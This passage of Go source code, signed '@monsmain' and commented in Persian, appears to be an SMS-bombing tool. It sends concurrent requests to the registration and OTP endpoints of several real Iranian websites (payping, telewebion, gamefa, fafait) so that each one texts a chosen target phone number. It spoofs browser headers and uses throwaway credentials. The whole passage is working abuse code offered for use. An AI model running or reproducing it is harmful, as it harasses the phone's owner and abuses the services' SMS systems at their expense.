				"extensions": map[string]interface{}{
					"persistedQuery": map[string]interface{}{
						"version":    1,
						"sha256Hash": "c86ec16685cd22d6b486686908526066b38df6f4cbcd29bef07bb2f3b18061e6", // ممکن است پویا باشد
					},
				},
			}
			sendJSONRequest(ctx, "https://web-api.fafait.net/api/graphql", payload, &wg, ch)
		}

		// api.payping.ir (Registration - POST JSON) - Endpoint ثبت نام
		wg.Add(1)
		tasks <- func() {
			payload := map[string]interface{}{
				"isOfficialSubmited": false,
				"username":           "rfewofuedhfyis", // پارامتر ثابت از نمونه شما (نام کاربری)
				"password":           "1234567890Aa",   // پارامتر ثابت از نمونه شما
				"phoneNumber":        phone,            // شماره تلفن هدف
				"planId":             0,
				"referralCode":       "",               // طبق نمونه خالی
				"repeatPassword":     "1234567890Aa",   // پارامتر ثابت از نمونه شما
			}
			sendJSONRequest(ctx, "https://api.payping.ir/v1/user/Register", payload, &wg, ch)
		}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// gateway.telewebion.com (SMS - POST JSON) - اضافه کردن هدرها و استفاده از client با کوکی
		wg.Add(1)
		tasks <- func() {
			// ساختار payload به صورت JSON
			payload := map[string]interface{}{
				"code": "98",
				"phone": getPhoneNumberNoZero(phone), // ارسال بدون صفر اول
				"smsStatus": "default",
			}

            jsonData, err := json.Marshal(payload)
            if err != nil {
                fmt.Printf("\033[01;31m[-] Error while encoding JSON for telewebion.com: %v\033[0m\n", err)
                ch <- http.StatusInternalServerError
                return
            }

			// ساخت درخواست با context و body
			req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", bytes.NewBuffer(jsonData))
			if err != nil {
				fmt.Printf("\033[01;31m[-] Error while creating request to telewebion.com: %v\033[0m\n", err)
				ch <- http.StatusInternalServerError
				return
			}

			// اضافه کردن هدرهای درخواستی
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Accept", "application/json, text/plain, */*")
			req.Header.Set("Accept-Language", "en-US,en;q=0.9,fa;q=0.8")
			req.Header.Set("Origin", "https://gate.telewebion.com")
			req.Header.Set("Referer", "https://gate.telewebion.com/")
			req.Header.Set("Sec-Ch-Ua", "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
			req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
			req.Header.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
			req.Header.Set("Sec-Fetch-Dest", "empty")
			req.Header.Set("Sec-Fetch-Mode", "cors")
			req.Header.Set("Sec-Fetch-Site", "same-site")
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36")

			// ارسال درخواست با client جدید که کوکی ها را مدیریت می کند
			resp, err := client.Do(req) // استفاده از client به جای http.DefaultClient
			if err != nil {
				// مدیریت خطا
				fmt.Printf("\033[01;31m[-] Error sending request to telewebion.com: %v\033[0m\n", err)
				ch <- http.StatusInternalServerError
				return
			}
			defer resp.Body.Close()

			// گزارش وضعیت
			ch <- resp.StatusCode
		}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// gamefa.com (Register flow 2 - SMS OTP step - POST Form) - اضافه کردن digits_reg_username
		wg.Add(1)
		tasks <- func(c *http.Client) func() { // ساختار برای پاس دادن client
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_forms_ajax")
				formData.Set("type", "register")
				formData.Set("digt_countrycode", "+98")
				formData.Set("phone", getPhoneNumberNoZero(phone))
				formData.Set("email", "koyaref766@kazvi.com")
				formData.Set("digits_reg_password", "trrdfstrtft")
				formData.Set("digits_process_register", "1")
				formData.Set("instance_id", "74e5368dbcf91c938f44b2af4b21cb3a") // ممکن است پویا باشد
				formData.Set("optional_data", "optional_data")
				formData.Set("dig_otp", "")
				formData.Set("digits", "1")
				formData.Set("digits_redirect_page", "//gamefa.com/")
				formData.Set("digits_form", "3827f92f86") // ممکن است پویا باشد
				formData.Set("_wp_http_referer", "/?login=true")
				formData.Set("container", "digits_protected")
				formData.Set("sub_action", "sms_otp")
				// >>>>>> اضافه کردن پارامتر digits_reg_username <<<<<<
				formData.Set("digits_reg_username", "randomuser123") // یک مقدار نمونه، میتونی از یک تابع برای تولید اسم تصادفی استفاده کنی

				sendFormRequest(c, ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch) // ارسال c
			}
		}(client) // ارسال client اصلی به تابع خارجی
                    }
		}
//Code by @monsmain
	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
//Code by @monsmain
